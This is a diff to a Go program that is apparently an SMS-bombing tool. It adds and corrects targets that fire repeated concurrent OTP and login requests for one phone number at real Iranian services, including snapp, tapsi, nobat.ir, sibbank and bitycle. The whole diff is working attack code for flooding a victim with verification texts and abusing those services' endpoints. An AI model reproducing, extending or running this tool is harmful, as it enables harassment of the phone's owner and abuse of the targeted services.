@@ -184,45 +184,60 @@ func main() {
 	// Loop to send requests concurrently
 	for i := 0; i < repeatCount; i++ {
 		
-		wg.Add(1)
-		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
-			"cellphone": phone, // Assuming the intent was to send the phone number in the payload key "cellphone"
+	wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
+			"cellphone": phone,
 		}, &wg, ch)
-		// nobat.ir (JSON)
-		wg.Add(1)
-		go sendJSONRequest(ctx, "https://api.nobat.ir/patient/login/phone", map[string]interface{}{
-			"mobile": phone,
-		}, &wg, ch)
-		// api.sibbank.ir (JSON)
-		wg.Add(1)
-		go sendJSONRequest(ctx, "https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
-			"phone_number": phone,
-		}, &wg, ch)
-		// sandbox.sibirani.ir invite (JSON)
-		wg.Add(1)
-		go sendJSONRequest(ctx, "https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
-			"username": phone,
-		}, &wg, ch)
-		// sandbox.sibirani.com generator-inv-token (JSON)
-		wg.Add(1)
-		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
-			"username": phone,
-		}, &wg, ch)
-		// api.bitycle.com (JSON)
-		wg.Add(1)
-		go sendJSONRequest(ctx, "https://api.bitycle.com/api/account/request_otp", map[string]interface{}{
-			"phone": phone,
-		}, &wg, ch)
-		// tap33.me v2/user (JSON - adjusted payload format)
-		wg.Add(1)
-		go sendJSONRequest(ctx, "https://tap33.me/api/v2/user", map[string]interface{}{
-			"phoneNumber": phone,
-		}, &wg, ch)
-		// khodro45.com (JSON)
+
+		// khodro45.com (JSON) - Corrected payload
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
 			"mobile": phone,
 		}, &wg, ch)
+
+		// accounts-api.tapsi.ir (JSON) - NEW API
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://accounts-api.tapsi.ir/api/v1/sso-user/auth", map[string]interface{}{
+			"phone_number": phone,
+		}, &wg, ch)
+
+		// api.bitycle.com register (JSON) - NEW API (different from request_otp)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
+
+		// api.nobat.ir (JSON) - Corrected payload (integer)
+		// Only send if phone number conversion to integer was successful
+		if err == nil {
+			wg.Add(1)
+			go sendJSONRequest(ctx, "https://api.nobat.ir/patient/login/phone", map[string]interface{}{
+				"mobile": phoneInt, // Use the integer version
+			}, &wg, ch)
+		} else {
+            // Optionally log that this API was skipped due to conversion error
+            // fmt.Println("\033[01;33m[!] Skipping nobat.ir request due to phone number integer conversion error.\033[0m")
+        }
+
+
+		// api.snapp.market loginMobileWithNoPass (JSON) - Corrected URL with query params and JSON payload
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
+			"cellphone": phone,
+		}, &wg, ch)
+
+		// api.sibbank.ir (JSON) - Corrected payload (assuming key is "phone_number")
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
+			"phone_number": phone,
+		}, &wg, ch)
+
+		// sandbox.sibirani.com generator-inv-token (JSON) - Corrected payload (using input phone)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
+			"username": phone,
+		}, &wg, ch)
+
 
 		// digitalsignup.snapp.ir otp (JSON)
 		// Note: The URL also contains the cellphone number as a query param.
